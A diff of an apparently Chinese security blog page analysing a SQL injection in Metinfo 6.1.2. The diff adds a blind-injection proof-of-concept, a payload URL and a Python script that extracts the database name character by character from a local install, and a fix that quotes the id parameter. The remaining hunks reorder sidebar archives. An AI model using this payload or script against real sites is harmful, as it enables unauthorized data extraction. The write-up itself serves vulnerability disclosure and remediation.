@@ -271,7 +271,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">960</span> / Reading time: <span class="post-count">5 min</span></span>
+                        <span>Word count: <span class="post-count">1,024</span> / Reading time: <span class="post-count">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -425,9 +425,12 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from met_config where name=&apos;met_fd_ok&apos; and lang=&apos;cn&apos;;</span><br><span class="line">+-----+-----------+-------+--------------+----------+---------+------+</span><br><span class="line">| id  | name      | value | mobile_value | columnid | flashid | lang |</span><br><span class="line">+-----+-----------+-------+--------------+----------+---------+------+</span><br><span class="line">| 278 | met_fd_ok | 1     |              |       44 |       0 | cn   |</span><br><span class="line">| 301 | met_fd_ok | 1     |              |       42 |       0 | cn   |</span><br><span class="line">+-----+-----------+-------+--------------+----------+---------+------+</span><br></pre></td></tr></table></figure>
 <p>所以需要id=44 or 42<br>于是payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/CMS/Metinfo6.1.2/admin/index.php?m=web&amp;n=message&amp;c=message&amp;a=domessage&amp;action=add&amp;lang=cn&amp;para137=aa&amp;para186=1@qq.com&amp;para138=18888888888&amp;para140=aaa&amp;id=42 and 1=1</span><br></pre></td></tr></table></figure>
-<p>写了一个脚本验证</p>
+<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><p>写了一个脚本验证</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2018-2-20 10:33</span><br><span class="line"># @Author  : Hu3sky</span><br><span class="line"># @FileName: met_sql.py</span><br><span class="line"># @Software: Submie</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">keyword = []</span><br><span class="line">i = 1</span><br><span class="line">url = &apos;http://127.0.0.1/CMS/Metinfo6.1.2/admin/index.php?m=web&amp;n=message&amp;c=message&amp;a=domessage&amp;action=add&amp;lang=cn&amp;para137=aa&amp;para186=1@qq.com&amp;para138=18888888888&amp;para140=aaa&amp;id=42 &apos;</span><br><span class="line"># payload = &apos;abcdefghijklmnopqrstuvwxyz&apos;</span><br><span class="line">while i &lt; 5:</span><br><span class="line">	for j in range(97,127):</span><br><span class="line">		# print(chr(j))</span><br><span class="line">		poc = url + &apos;and ascii(substr((select database()),&apos; + str(i) + &apos;,1))=&apos; + str(j)</span><br><span class="line">		# print(poc)</span><br><span class="line">		r = requests.get(url=poc)</span><br><span class="line">		if &apos;验证码错误！&apos; in r.text:</span><br><span class="line">			print(str(i)+&apos;:&apos;+chr(j))</span><br><span class="line">			keyword.append(chr(j))</span><br><span class="line">			break</span><br><span class="line">	i = i+1</span><br><span class="line">print(keyword)</span><br></pre></td></tr></table></figure>
 <p><img src="/met/14.png" alt="1"><br>得到数据库名 met</p>
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>加单引号包裹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$met_fd_ok=DB::get_one(&quot;select * from &#123;$_M[table][config]&#125; where </span><br><span class="line">lang =&apos;&#123;$_M[form][lang]&#125;&apos; and  name= &apos;met_fd_ok&apos; and columnid = </span><br><span class="line">&#123;$_M[form][id]&#125;&quot;);</span><br></pre></td></tr></table></figure></p>
+<p>改为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$met_fd_ok=DB::get_one(&quot;select * from &#123;$_M[table][config]&#125; where </span><br><span class="line">lang =&apos;&#123;$_M[form][lang]&#125;&apos; and  name= &apos;met_fd_ok&apos; and columnid = </span><br><span class="line">&apos;&#123;$_M[form][id]&#125;&apos;&quot;);</span><br></pre></td></tr></table></figure>
 
     </article>
     <!-- license  -->
@@ -583,7 +586,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Metinfo-6-1-2-SqlInjection"><span class="toc-number">1.</span> <span class="toc-text">Metinfo 6.1.2 SqlInjection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Source"><span class="toc-number">1.1.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#触发过程"><span class="toc-number">1.3.</span> <span class="toc-text">触发过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#验证码绕过"><span class="toc-number">1.3.1.</span> <span class="toc-text">验证码绕过</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Metinfo-6-1-2-SqlInjection"><span class="toc-number">1.</span> <span class="toc-text">Metinfo 6.1.2 SqlInjection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Source"><span class="toc-number">1.1.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#触发过程"><span class="toc-number">1.3.</span> <span class="toc-text">触发过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#验证码绕过"><span class="toc-number">1.3.1.</span> <span class="toc-text">验证码绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用脚本"><span class="toc-number">1.4.</span> <span class="toc-text">利用脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修复方案"><span class="toc-number">1.5.</span> <span class="toc-text">修复方案</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -596,6 +599,18 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -1778,6 +1793,29 @@ top:50vh;
         </li>
     
     
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/06/29/The game of bob/" >Bob 1.0.1</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
         <li class="archive-post-item">
             <span class="archive-post-date">04/15</span><a class="archive-post-title" href= "/2018/04/15/线下赛总结/" >线下赛总结</a>
         </li>
@@ -1818,21 +1856,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/03/28/cookie与session/" >cookie与session的笔记</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2018 </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/会员日Pwnhub复现/" >会员日Pwnhub题目的复现</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/17/JAVA学习情况/" >java学习笔记</a>
         </li>
     
     
@@ -1874,7 +1898,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/23/Hooskcms/" >Hooskcms 几个小洞</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/03/28/cookie与session/" >cookie与session的笔记</a>
         </li>
     
     
@@ -1888,35 +1912,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/06/29/The game of bob/" >Bob 1.0.1</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/17/JAVA学习情况/" >java学习笔记</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2018 </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/21</span><a class="archive-post-title" href= "/2018/01/21/0ctf-ezdoor/" >0ctf-ezdoor</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/10/06/destoon/" >destoon前台getshell复现</a>
         </li>
     
     
@@ -1944,7 +1940,26 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/10/06/destoon/" >destoon前台getshell复现</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/23/Hooskcms/" >Hooskcms 几个小洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/会员日Pwnhub复现/" >会员日Pwnhub题目的复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/21</span><a class="archive-post-title" href= "/2018/01/21/0ctf-ezdoor/" >0ctf-ezdoor</a>
         </li>
     
     </div>
@@ -1985,43 +2000,43 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="学习计划"><span class="iconfont-archer">&#xe60a;</span>学习计划</span>
-    
         <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
     
-        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
+        <span class="sidebar-category-name" data-categories="学习计划"><span class="iconfont-archer">&#xe60a;</span>学习计划</span>
     
         <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
     
-        <span class="sidebar-category-name" data-categories="学习笔记"><span class="iconfont-archer">&#xe60a;</span>学习笔记</span>
+        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
     
         <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
     
-        <span class="sidebar-category-name" data-categories="sql注入"><span class="iconfont-archer">&#xe60a;</span>sql注入</span>
+        <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
+    
+        <span class="sidebar-category-name" data-categories="学习笔记"><span class="iconfont-archer">&#xe60a;</span>学习笔记</span>
     
         <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
     
         <span class="sidebar-category-name" data-categories="CVE-Request"><span class="iconfont-archer">&#xe60a;</span>CVE-Request</span>
     
+        <span class="sidebar-category-name" data-categories="sql注入"><span class="iconfont-archer">&#xe60a;</span>sql注入</span>
+    
         <span class="sidebar-category-name" data-categories="Arbitrary-File-Upload"><span class="iconfont-archer">&#xe60a;</span>Arbitrary-File-Upload</span>
     
         <span class="sidebar-category-name" data-categories="Empire"><span class="iconfont-archer">&#xe60a;</span>Empire</span>
-    
-        <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
     
         <span class="sidebar-category-name" data-categories="write-up"><span class="iconfont-archer">&#xe60a;</span>write-up</span>
     
         <span class="sidebar-category-name" data-categories="git"><span class="iconfont-archer">&#xe60a;</span>git</span>
     
-        <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
-    
         <span class="sidebar-category-name" data-categories="php反序列化"><span class="iconfont-archer">&#xe60a;</span>php反序列化</span>
+    
+        <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
     
         <span class="sidebar-category-name" data-categories="scrapy"><span class="iconfont-archer">&#xe60a;</span>scrapy</span>
     
-        <span class="sidebar-category-name" data-categories="xxe"><span class="iconfont-archer">&#xe60a;</span>xxe</span>
-    
         <span class="sidebar-category-name" data-categories="代码执行"><span class="iconfont-archer">&#xe60a;</span>代码执行</span>
+    
+        <span class="sidebar-category-name" data-categories="xxe"><span class="iconfont-archer">&#xe60a;</span>xxe</span>
     
         <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
     
